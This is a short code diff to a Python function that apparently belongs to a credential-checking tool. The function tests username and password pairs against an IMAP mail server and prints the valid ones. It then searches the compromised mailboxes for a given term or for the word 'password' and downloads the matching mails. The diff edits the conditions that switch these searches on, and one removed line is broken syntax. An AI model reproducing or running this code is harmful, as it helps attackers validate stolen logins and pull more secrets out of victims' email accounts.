@@ -32,13 +32,13 @@ def mailcheck(file, server, out,searchpasswords,search):
             click.echo("GOOD !!!" + user + " : " + credentials[user])
             good[user] = credentials[user]
 
-            if search == 'True':
+            if search != 'True':
                 UIDs = imapObj.search([u'TEXT', search])
                 folder = search
                 if UIDs:
                     downmails(user,imapObj,UIDs,folder)
 
-            if searchpasswords \= '':
+            if searchpasswords == 'True':
                 UIDs = imapObj.search([u'TEXT', 'password'] )
                 folder = 'passwords'
 
